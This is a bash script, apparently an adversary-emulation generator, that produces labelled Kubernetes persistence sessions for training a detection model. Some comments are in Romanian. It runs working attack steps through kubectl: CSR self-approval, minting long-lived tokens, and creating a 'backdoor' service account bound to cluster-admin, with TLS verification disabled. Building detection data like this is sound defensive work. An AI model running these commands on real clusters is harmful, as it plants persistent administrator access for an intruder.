#!/usr/bin/env bash
# Persistence via CSR self-approve, TokenRequest and cluster-admin binding, in plain kubectl.
#
# Training half of a pair; Stratus persistence is held out. Implemented differently on purpose.
# The signals this produces (has_csr, has_tokenreq) only help if they are in the feature list -
# without them the model is blind to this tactic.
set -uo pipefail
OUT="$(cd "$(dirname "$0")/../reference" && pwd)"; SF="$OUT/sessions.txt"; mkdir -p "$OUT"; touch "$SF"
nowZ(){ date -u +%Y-%m-%dT%H:%M:%SZ; }
SERVER=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')
KC=""
mkkc(){
  kubectl create sa "$1" -n default >/dev/null 2>&1||true
  kubectl create clusterrolebinding "rt-$1" --clusterrole=cluster-admin --serviceaccount=default:"$1" >/dev/null 2>&1||true
  local T; T=$(kubectl create token "$1" -n default --duration=2h 2>/dev/null); KC=/tmp/kc-$1
  kubectl config --kubeconfig="$KC" set-cluster c --server="$SERVER" --insecure-skip-tls-verify=true >/dev/null
  kubectl config --kubeconfig="$KC" set-credentials u --token="$T" >/dev/null
  kubectl config --kubeconfig="$KC" set-context c --cluster=c --user=u >/dev/null
  kubectl config --kubeconfig="$KC" use-context c >/dev/null
}
K(){ kubectl --kubeconfig "$KC" "$@" >/dev/null 2>&1 || true; }
cleanup(){
  kubectl delete csr "persist-$1" >/dev/null 2>&1||true
  kubectl delete clusterrolebinding "rt-$1" "backdoor-$1" >/dev/null 2>&1||true
  kubectl delete sa "$1" "backdoor-$1" -n default >/dev/null 2>&1||true
}

for id in adversary-persistsyn-1 adversary-persistsyn-2 adversary-persistsyn-3; do
  mkkc "$id"
  N=$(grep -cE "SESSION [0-9]+ START" "$SF"); N=$((N+1)); echo "  S$N PERSISTENCE SINTETIC ($id)"
  echo "SESSION $N START $(nowZ)" >> "$SF"
  for cycle in 1 2 3; do
    # PROPRIU (diferit de Stratus): (1) CSR self-approve, (2) TokenRequest abuse, (3) backdoor SA + CRB persistent
    CSRB=$(printf 'fake-csr-%s' "$cycle" | base64 2>/dev/null)
    K apply -f - <<EOF
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata: {name: persist-$id}
spec: {request: $CSRB, signerName: kubernetes.io/kube-apiserver-client, usages: [client auth]}
EOF
    K certificate approve "persist-$id"                                   # has_csr
    K create token "$id" -n default --duration=24h                       # has_tokenreq (token lung-durata)
    kubectl --kubeconfig "$KC" create sa "backdoor-$id" -n default >/dev/null 2>&1||true
    K create clusterrolebinding "backdoor-$id" --clusterrole=cluster-admin --serviceaccount=default:"backdoor-$id"
    K create token "backdoor-$id" -n default --duration=24h
  done
  echo "SESSION $N END $(nowZ)" >> "$SF"
  cleanup "$id"
done
echo ">> done, tagged persistsyn (train half; Stratus persistence is the held-out half)"
echo ">> NOTA: adauga has_csr + has_tokenreq in FEAT (train_v2/train_production/service) ca modelul sa VADA semnalul."
tail -3 "$SF"
